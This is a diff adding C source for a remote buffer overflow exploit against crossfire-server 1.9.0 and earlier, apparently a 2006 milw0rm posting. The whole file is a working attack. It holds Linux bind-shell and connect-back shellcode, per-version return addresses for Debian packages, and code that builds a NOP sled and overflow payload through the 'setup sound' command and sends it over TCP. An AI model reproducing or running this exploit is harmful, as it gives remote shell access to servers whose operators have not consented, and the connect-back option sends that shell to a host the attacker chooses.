@@ -1,0 +1,208 @@
+// crossfire-server <= 1.9.0 "SetUp()" remote buffer overflow
+//
+// exploit by landser - ihsahn at gmail com
+// vote http://shinui.org.il
+//
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <getopt.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+
+#define PORT 13327 // default port
+#define SC_PORT 33333 // default shellcode port
+#define SC_HOST "127.0.0.1" // default shellcode host
+
+unsigned char sc_cb[] = // izik's
+	"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd"
+	"\x80\x5b\x5d\xbeHOST\xf7\xd6\x56\x66\xbdPR\x0f\xcd\x09\xdd"
+	"\x55\x43\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x87\xd9"
+	"\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f"
+	"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xdf";
+
+unsigned char sc_bind[] = // izik's
+	"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd"
+	"\x80\x5b\x5d\x52\x66\xbdPR\x0f\xcd\x09\xdd\x55\x6a\x10\x51"
+	"\x50\x89\xe1\xb0\x66\xcd\x80\xb3\x04\xb0\x66\xcd\x80\x5f"
+	"\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x93\xb0\x02\xcd"
+	"\x80\x85\xc0\x75\x1a\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
+	"\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
+	"\x53\xeb\xb2\x6a\x06\x58\xcd\x80\xb3\x04\xeb\xc9";
+
+struct {
+	const char *type;
+	unsigned char *code;
+} shellcodes[] = {
+	{"bind",		sc_bind},
+	{"connectback",		sc_cb},
+};
+
+struct {
+	const char *ver;
+	unsigned long ret; // a "jmp *%eax" instruction
+	unsigned short int len;
+} targets[] = {
+	{"crossfire-server_1.6.0.dfsg.1-4_i386.deb",	0x080d6f48, 0x1028},
+	{"crossfire-server_1.8.0-2_i386.deb",		0x080506d7, 0x1130},
+	{"crossfire-server_1.9.0-1_i386.deb",		0x0807aefa, 0x1130},
+	{"crash",					0xcccccccc, 0x1300},
+};
+
+#define structsize(x) (sizeof x / sizeof x[0])
+
+int s;
+int n = -1;
+unsigned char *sc = sc_bind; // default shellcode
+unsigned char buf[0x2000];
+
+void establish (char *, int);
+void usage (char *);
+void update (unsigned char *, int, char *);
+void writebuf (void);
+
+int main (int argc, char **argv) {
+	int port = 0; // default value
+	unsigned short int sc_port = 0;
+	char *sc_host = NULL;
+
+	printf("cf190.c by landser - ihsahn at gmail com\n\n");
+
+	char c;
+	while ((c = getopt(argc, argv, "t:p:h:d:s:")) != -1) {
+		switch (c) {
+			case 's': sc = shellcodes[atoi(optarg)].code; break;
+			case 'h': sc_host = strdup(optarg); break;
+			case 'd': sc_port = atoi(optarg); break;
+			case 't': n = atoi(optarg); break;
+			case 'p': port = atoi(optarg); break;
+			case '?': usage(argv[0]); return EXIT_FAILURE;
+		}
+	}
+
+	if ((n < 0) || (n >= structsize(targets))) {
+		printf("invalid target\n");
+		usage(argv[0]);
+		return EXIT_FAILURE;
+	}
+	
+	if ((optind + 1) != argc) {
+		printf("no hostname\n");
+		usage(argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	establish(argv[optind], port ? port : PORT);
+	
+	update(sc, sc_port, sc_host);
+       
+	writebuf();
+
+	printf("> sending\n");
+
+	if (send(s, buf, targets[n].len + 2, 0) < 0) {
+		perror("send()");
+		return EXIT_FAILURE;
+	}
+	usleep(100000);
+
+	printf("> done\n");
+	
+	close(s);
+
+	return EXIT_SUCCESS;
+}
+
+void establish (char *ip, int port) {
+	struct sockaddr_in sa;
+	struct hostent *h;
+
+	if (!(h = gethostbyname(ip))) {
+		herror("gethostbyname()");
+		exit(EXIT_FAILURE);
+	}
+	printf("> resolved %s to %s\n", ip,
+			inet_ntoa(**((struct in_addr **)h->h_addr_list)));
+	
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(port);
+	sa.sin_addr = **((struct in_addr **)h->h_addr_list);
+	
+	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+		perror("socket()");
+		exit(EXIT_FAILURE);
+	}
+
+	if (connect(s, (struct sockaddr *)&sa, sizeof(struct sockaddr)) < 0) {
+		perror("connect()");
+		exit(EXIT_FAILURE);
+	}
+
+	printf ("> connected to %s:%d.\n", inet_ntoa(**((struct in_addr **)h->h_addr_list)), port);
+}
+
+void usage (char *argv0) {
+	int i;
+	
+	printf("usage: %s -t <target> [-s <shellcode>] "
+			"[-d <connectback/bind port] [-h <connectback ip>] "
+			"host [-p <port>]\n", argv0);
+
+	printf("- targets:\n");
+	for (i=0;i<structsize(targets);i++)
+		printf("%d. %s\n", i, targets[i].ver);
+
+	printf("- shellcodes: (default 0)\n");
+	for (i=0;i<structsize(shellcodes);i++)
+		printf("%d. %s\n", i, shellcodes[i].type);
+}
+
+void update (unsigned char *code, int port, char *host) {
+	if (!port) port = SC_PORT;
+	
+	if (!(port & 0xff) || !((port >> 8) & 0xff)) {
+		printf("bad cb port\n");
+		exit(EXIT_FAILURE);
+	}
+	*(unsigned short int *)(strstr(code, "PR")) = port;
+
+	if (strstr(code, "HOST")) {
+		in_addr_t inaddr;
+
+		if (!host) host = SC_HOST;
+		inaddr = inet_addr(host);
+		
+		if (inaddr == INADDR_NONE || strstr(host, "255")) {
+			// ~(255) is 0
+			printf("invalid cb hostname\n");
+			exit(EXIT_FAILURE);
+		}
+		*(in_addr_t *)(strstr(code, "HOST")) = ~inaddr;
+	}
+	
+	if (host) free(host);
+}
+	
+void writebuf (void) {
+	unsigned char *ptr = buf;
+	
+	memset(buf, 0x90, sizeof buf);
+
+	*ptr++ = (targets[n].len>> 8) & 0xff;
+	*ptr++ = targets[n].len & 0xff;
+	
+	memcpy(ptr, "setup sound ", strlen("setup sound "));
+	ptr += strlen("setup sound ");
+	
+	ptr += 120; // leave 120 nops before the shellcode
+	memcpy(ptr, sc, strlen(sc));
+	
+	ptr = &buf[targets[n].len - 10];
+	*(unsigned long *)ptr = targets[n].ret;
+}
+
+// milw0rm.com [2006-03-13]
